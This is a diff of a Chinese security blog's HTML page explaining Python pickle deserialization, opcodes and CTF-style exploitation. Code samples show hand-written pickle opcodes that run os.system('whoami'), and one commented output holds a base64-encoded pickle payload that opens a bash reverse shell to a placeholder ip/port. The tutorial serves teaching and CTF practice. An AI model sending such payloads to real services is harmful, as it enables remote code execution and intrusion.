@@ -11,7 +11,7 @@
   <meta itemprop="name" content="python pickle反序列化">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="976">
+  <meta itemprop="wordCount" content="952">
   <meta itemprop="keywords" content="代码审计,Python安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/30/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="python pickle反序列化">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/python\/python%E5%AE%89%E5%85%A8\/30\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, python安全","wordcount":  976 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, python安全","wordcount":  952 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/python\/python%E5%AE%89%E5%85%A8\/30\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Python Pickle反序列化</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="976 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="952 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,31 +152,52 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li></li>
-      </ul>
-    </li>
+    <li><a href="#pickle特点"><code>pickle特点</code></a></li>
+    <li><a href="#pickle对比json"><code>pickle对比json</code></a></li>
+    <li><a href="#可序列化的对象"><code>可序列化的对象</code></a></li>
+    <li><a href="#pickle协议"><code>pickle协议</code></a></li>
+    <li><a href="#opcode"><code>opcode</code></a></li>
+    <li><a href="#pickle工作原理"><code>pickle工作原理</code></a></li>
+    <li><a href="#手写opcode">手写opcode</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#序列化">序列化</a></li>
+    <li><a href="#反序列化">反序列化</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#利用思路">利用思路</a></li>
+    <li><a href="#初步认识pickle-exp的简单demo">初步认识：pickle EXP的简单demo</a></li>
+    <li><a href="#命令执行">命令执行</a></li>
+    <li><a href="#变量覆盖">变量覆盖</a></li>
+    <li><a href="#pker">pker</a></li>
+    <li><a href="#注意事项">注意事项</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#watevrctf-2019pickle-store">[watevrCTF-2019]Pickle Store</a></li>
+    <li><a href="#ciscn2019-华北赛区-day1-web2ikun">[CISCN2019 华北赛区 Day1 Web2]ikun</a></li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="heading" class="heading-element"><span>0.0.0.1  </span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="heading" class="heading-element"><span></span>
   <a href="#heading" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h5 id="引言" class="heading-element"><span>0.0.0.2  引言</span>
+</h1><h1 id="引言" class="heading-element"><span>引言</span>
   <a href="#%e5%bc%95%e8%a8%80" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>在日常开发中，所有的对象都是存储在内存当中，尤其是像python这样的坚持一切接对象的高级程序设计语言，一旦关机，在写在内存中的数据都将不复存在。另一方面，存储在内存够中的对象由于编程语言、网络环境等等因素，很难在网络中进行传输交互。由此，就诞生了一种机制，可以实现内存中的对象与方便持久化在磁盘中或在网络中进行交互的数据格式（str、bites)之间的相互转换。这种机制就叫序列化与发序列化：</p>
+</h1><p>在日常开发中，所有的对象都是存储在内存当中，尤其是像python这样的坚持一切接对象的高级程序设计语言，一旦关机，在写在内存中的数据都将不复存在。另一方面，存储在内存够中的对象由于编程语言、网络环境等等因素，很难在网络中进行传输交互。由此，就诞生了一种机制，可以实现内存中的对象与方便持久化在磁盘中或在网络中进行交互的数据格式（str、bites)之间的相互转换。这种机制就叫序列化与发序列化：</p>
 <p>　　<strong>序列化：将内存中的不可持久化和传输对象转换为可方便持久化和传输对象的过程。</strong></p>
 <p>　　<strong>反序列化：将可持久化和传输对象转换为不可持久化和传输对象的过程。</strong></p>
 <p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对<code>opcode</code>的编写可以进行Python代码执行、覆盖变量等操作。直接编写的<code>opcode</code>灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p>
 <p>既然opcode能够执行Python代码，那自然就免不了安全问题。</p>
-<h5 id="认识" class="heading-element"><span>0.0.0.3  认识</span>
+<h1 id="认识" class="heading-element"><span>认识</span>
   <a href="#%e8%ae%a4%e8%af%86" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>pickle序列化是python进行序列化和反序列化常用的方法，除了pickle之外，Python中还有其他可用的序列化和反序列化方法。其中一些方法包括：</p>
+</h1><p>pickle序列化是python进行序列化和反序列化常用的方法，除了pickle之外，Python中还有其他可用的序列化和反序列化方法。其中一些方法包括：</p>
 <blockquote>
 <ol>
 <li>JSON（JavaScript对象表示法）- 这是一种轻量级的数据交换格式，易于人类阅读和编写，也易于机器解析和生成。它通常用于Web应用程序和API。</li>
@@ -186,11 +207,11 @@
 <li>avro - 这是一种数据序列化系统，旨在支持动态模式和高效的二进制编码。它通常用于大数据处理系统，例如Hadoop。</li>
 </ol>
 </blockquote>
-<h6 id="pickle特点" class="heading-element"><span>0.0.0.3.1  <code>pickle特点</code></span>
+<h2 id="pickle特点" class="heading-element"><span><code>pickle特点</code></span>
   <a href="#pickle%e7%89%b9%e7%82%b9" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <ol>
 <li>能够直接序列化大多数 <code>Python</code> 对象，方便</li>
 <li>能够以更快的速度序列化 <code>Python</code> 对象，快速</li>
@@ -207,11 +228,11 @@
 <li>pickle 可以将 Python 对象直接序列化为二进制格式，因此它的序列化结果可以存储到文件或传输到其他计算机上。</li>
 </ol>
 </blockquote>
-<h6 id="pickle对比json" class="heading-element"><span>0.0.0.3.2  <code>pickle对比json</code></span>
+<h2 id="pickle对比json" class="heading-element"><span><code>pickle对比json</code></span>
   <a href="#pickle%e5%af%b9%e6%af%94json" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <ul>
 <li>
 <p>序列化数据类型：</p>
@@ -235,11 +256,11 @@
 </li>
 </ul>
 </blockquote>
-<h6 id="可序列化的对象" class="heading-element"><span>0.0.0.3.3  <code>可序列化的对象</code></span>
+<h2 id="可序列化的对象" class="heading-element"><span><code>可序列化的对象</code></span>
   <a href="#%e5%8f%af%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e5%af%b9%e8%b1%a1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <ul>
 <li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
 <li>整数、浮点数、复数</li>
@@ -251,11 +272,11 @@
 <li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
 </ul>
 </blockquote>
-<h6 id="pickle协议" class="heading-element"><span>0.0.0.3.4  <code>pickle协议</code></span>
+<h2 id="pickle协议" class="heading-element"><span><code>pickle协议</code></span>
   <a href="#pickle%e5%8d%8f%e8%ae%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>pickle协议的主要特点包括：</p>
 <ul>
 <li>支持循环引用和共享对象（即相同的对象在序列化时只会被序列化一次，而在反序列化时被恢复为同一个对象）；</li>
@@ -292,11 +313,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">serialized</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">p</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">deserialized</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">serialized</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">deserialized</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">name</span>)  <span style="color:#828b96;font-style:italic"># Alice</span>
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">deserialized</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">age</span>)  <span style="color:#828b96;font-style:italic"># 25</span></span></span></code></pre></div><h6 id="opcode" class="heading-element"><span>0.0.0.3.5  <code>opcode</code></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">deserialized</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">age</span>)  <span style="color:#828b96;font-style:italic"># 25</span></span></span></code></pre></div><h2 id="opcode" class="heading-element"><span><code>opcode</code></span>
   <a href="#opcode" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>opcode是Python字节码的一种表示形式。字节码是Python代码经过编译后生成的中间代码，它比源代码更接近计算机底层，可以被Python虚拟机（简称PVM）直接执行。</p>
+</h2><p>opcode是Python字节码的一种表示形式。字节码是Python代码经过编译后生成的中间代码，它比源代码更接近计算机底层，可以被Python虚拟机（简称PVM）直接执行。</p>
 <p>在Python中，pickle序列化过程中使用的opcode（operation code）是一种特殊的二进制指令，用于描述pickle数据流中的不同数据类型和结构。Python中的pickle协议定义了一组opcode，不同版本的协议会支持不同的opcode。</p>
 <p>可以使用pickletools模块来解析和分析pickle数据流中的opcode序列，使用pickletools可以方便的将opcode转化为便于肉眼读取的形式，可以对pickle数据流进行反汇编、可视化、语义解释等等操作</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">pickletools</span>
@@ -314,11 +335,11 @@
 </span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">48</span>: <span style="color:#58a1dd">R</span>    <span style="color:#58a1dd">REDUCE</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">49</span>: <span style="color:#58a1dd">q</span>    <span style="color:#58a1dd">BINPUT</span>     <span style="color:#a6be9d">3</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">51</span>: <span style="color:#ff636f">.</span>    <span style="color:#58a1dd">STOP</span>
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highest</span> <span style="color:#58a1dd">protocol</span> <span style="color:#58a1dd">among</span> <span style="color:#58a1dd">opcodes</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">2</span></span></span></code></pre></div><h6 id="pickle工作原理" class="heading-element"><span>0.0.0.3.6  <code>pickle工作原理</code></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highest</span> <span style="color:#58a1dd">protocol</span> <span style="color:#58a1dd">among</span> <span style="color:#58a1dd">opcodes</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">2</span></span></span></code></pre></div><h2 id="pickle工作原理" class="heading-element"><span><code>pickle工作原理</code></span>
   <a href="#pickle%e5%b7%a5%e4%bd%9c%e5%8e%9f%e7%90%86" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>我们上文提到了，其实pickle可以看作是一种独立的栈语言，它由一串串opcode（指令集）组成。该语言的解析是依靠Pickle Virtual Machine （PVM）进行的。</p>
+</h2><p>我们上文提到了，其实pickle可以看作是一种独立的栈语言，它由一串串opcode（指令集）组成。该语言的解析是依靠Pickle Virtual Machine （PVM）进行的。</p>
 <p>PVM由以下三部分组成</p>
 <ul>
 <li>
@@ -332,11 +353,11 @@
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231117124.png" alt="image-20230323111721008" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231117124.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231117124.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231117124.png?size=large 2x" data-title="image-20230323111721008" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 </li>
 </ul>
-<h6 id="手写opcode" class="heading-element"><span>0.0.0.3.7  手写opcode</span>
+<h2 id="手写opcode" class="heading-element"><span>手写opcode</span>
   <a href="#%e6%89%8b%e5%86%99opcode" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li>
 <li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
 <li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode</li>
@@ -548,7 +569,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">tR.&#39;&#39;&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">opcode</span>)
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####xiaoh\34946</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">opcode</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;&#39;&#39;cos
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#xiaoh\34946</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">opcode</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;&#39;&#39;cos
 </span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">system
 </span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">(S&#39;whoami&#39;
 </span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">tR.&#39;&#39;&#39;</span>
@@ -569,7 +590,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">tR.&#39;&#39;&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">pickletools</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dis</span>(<span style="color:#58a1dd">opcode</span>)
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#######</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">###</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">0</span>: <span style="color:#58a1dd">c</span>    <span style="color:#58a1dd">GLOBAL</span>     <span style="color:#a6be9d">&#39;os system&#39;</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">11</span>: (    <span style="color:#58a1dd">MARK</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">12</span>: <span style="color:#58a1dd">S</span>        <span style="color:#58a1dd">STRING</span>     <span style="color:#a6be9d">&#39;whoami&#39;</span>
@@ -589,42 +610,42 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">a</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">base64</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">b64encode</span>(<span style="color:#58a1dd">a</span>))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### 输出</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### b&#39;(cos\nsystem\nS\&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#34;\&#39;\no.&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### b&#39;KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMSInCm8u&#39;</span></span></span></code></pre></div><h5 id="用法" class="heading-element"><span>0.0.0.4  用法</span>
